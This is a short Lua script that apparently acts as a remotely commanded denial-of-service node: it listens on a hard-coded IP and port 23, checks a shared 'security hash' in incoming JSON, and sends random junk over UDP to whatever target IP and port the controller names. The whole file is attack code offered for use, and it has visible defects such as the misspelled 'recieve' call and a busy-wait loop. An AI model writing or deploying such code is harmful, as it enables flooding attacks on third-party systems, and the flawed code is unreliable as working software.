local _socket=require("luasocket")
local _json=require("cjson")

local _udp =assert(_socket.udp())

local _securityhash="*@(-!(2-19wAuscA(@nAS(CmA(SC0a;ZX>wOAx;aWOCZ.w(20SkcZPq;AocnAI"				--needed to verify the attack is authorized
local _server=assert(_socket.bind("163.153.172.11",23))

local _bit={'000','001','010','100','011','101','110','111'}
local _rand=math.random

while 1 do
	local _client = _server:accept()
	_client:settimeout(10)
	local _result,_err = _client:recieve()
	local _result=_json.decode(_result)
	local _cont,_error=false,{false,""}
	coroutine.resume(coroutine.create(function()
		if _result.securityhash~=_securityhash then _cont=true _error[1]=true _error[2]="Incorrect security hash" return end
		local _attacksize = _result.attacksize
		local _targetip = _result.targetip
		local _targetport = _result.port
		local _attackdata = {}
		for i=1,_attacksize do
			_attackdata[#_attackdata+1]=_bit[_rand(#_bit)]
		end
		_attackdata=_json.encode(_attackdata)
		_udp:sendto(_attackdata,_targetip,_targetport)
		_cont=true
	end)
	while _cont==false do end
	local _response={['executed']=_cont, ['errors']=_error[1], ['errorreason']=_error[2]}
	_response=_json.encode(_response)
	_client:send(_response)
end
